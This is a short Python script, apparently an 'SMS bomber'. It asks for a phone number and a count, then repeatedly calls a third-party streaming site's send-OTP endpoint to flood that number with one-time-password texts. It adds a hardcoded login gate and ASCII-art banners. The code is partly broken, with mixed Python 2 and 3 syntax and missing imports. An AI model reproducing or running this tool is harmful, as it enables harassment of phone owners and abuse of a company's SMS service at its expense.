import  requests
 
 
 
 
 


print ("ENTER YOUR USERNAME & PASSWORD ")	


CorrectUsername = "MDALAMIN"
CorrectPassword = "HAKERBOY"

loop = 'true'
while (loop == 'true'):
    username = raw_input("Tool Username")
    if (username == CorrectUsername):
    	password = raw_input("Tool Password")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:MDALAMIN
	    time.sleep(2)
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.facebook.com/mdalamin12345')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.facebook.com/mdalamin12345')


print("""________________$$$$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n __________$$$$$$____$$$$$$\n ________$$____$$____$$____$$$$\n ________$$____$$____$$____$$__$$\n $$$$$$__$$____$$____$$____$$____$$\n $$____$$$$________________$$____$$\n $$______$$______________________$$\n __$$____$$______________________$$\n ___$$$__$$______________________$$\n ____$$__________________________$$\n _____$$$________________________$$\n ______$$______________________$$$\n _______$$$____________________$$\n ________$$____________________$$\n _________$$$________________$$$\n __________$$________________$$\n __________$$$$$$$$$$$$$$$$$$$$""")
    


print("""                 
     /\   | |ALAMIN  /\   |\     /| | | | |  | |
    /  \  | |       /  \  | \   / | | | |  \ | |
   / /\ \ | |      / /\ \ | |\/ | | | | | | \  |
  / ____ \| |____ / /__\_\| |   | | | | | |\ \ |
 /_/    \_\______/_/    \_\_|   |_| | | | | \ \|""")

number=str(input(" Enter The Number : "))

amount=int(input(" Enter The Amount : "))

alamin="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"


for i in range(amount):
    requests.get(alamin)
    print(str(i+1)+"ALAMIN SMS Sent")

